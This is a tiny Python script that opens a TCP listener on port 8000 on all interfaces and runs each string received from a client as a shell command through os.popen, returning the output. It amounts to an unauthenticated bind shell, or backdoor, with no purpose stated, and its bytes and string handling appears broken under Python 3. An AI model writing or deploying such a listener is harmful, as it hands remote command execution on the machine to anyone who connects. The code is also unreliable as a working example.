#!/usr/bin/env python3
#coding=utf-8

import socket,os

HOST=''
PORT=8000

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST,PORT))
s.listen(1)

while 1:
    conn,addr=s.accept()
    print('Connected by', addr)
    while 1:
      cmd=conn.recv(1024)
      print("the cmd is:",cmd)
      if not cmd:break
      cmd_result = os.popen(cmd).read()
      conn.sendall(cmd_result)
conn.close()


